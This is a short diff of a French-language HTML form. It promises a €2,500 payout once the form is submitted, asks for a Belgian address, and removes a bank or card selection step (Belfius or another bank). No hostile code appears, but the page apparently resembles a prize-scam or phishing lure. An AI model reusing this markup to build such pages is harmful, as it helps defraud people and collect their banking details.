@@ -142,26 +142,7 @@ Le versement sera effectué après réception du formulaire.
           <label>Adresse complète *</label>
           <input type="text" id="address" name="address" required="" placeholder="Rue, Ville, Code postal, Belgique">
         </div>
-
-        <div class="form-field">
-          <label>Méthode de virement *</label>
-          <div class="payment-methods">
-            <button type="button" class="payment-btn" id="cardBtn" name="method" onclick="selectPayment('card')">
-              💳 Belfius (carte)
-            </button>
-            <button type="button" class="payment-btn" id="bankBtn" name="method" onclick="selectPayment('bank')">
-              🏦 Autre banque
-            </button>
-          </div>
-        </div>
-
-        <div id="paymentInfo" class="hidden" style="background: #eff6ff; border: 1px solid #bfdbfe; border-radius: 8px; padding: 12px; margin-bottom: 20px;">
-          <div style="display: flex; align-items: start; gap: 8px; color: #1d4ed8; font-size: 13px;">
-            <span>ℹ️</span>
-            <div id="paymentInfoText">Veuillez sélectionner une méthode de virement ci-dessus.</div>
-          </div>
-        </div>
-
+        
         <button type="submit" class="submit-btn" id="submitBtn" disabled="">
           🎉 JE VALIDE <span id="winAmountBtn" style="display:none">2500</span> ! 💰
         </button>
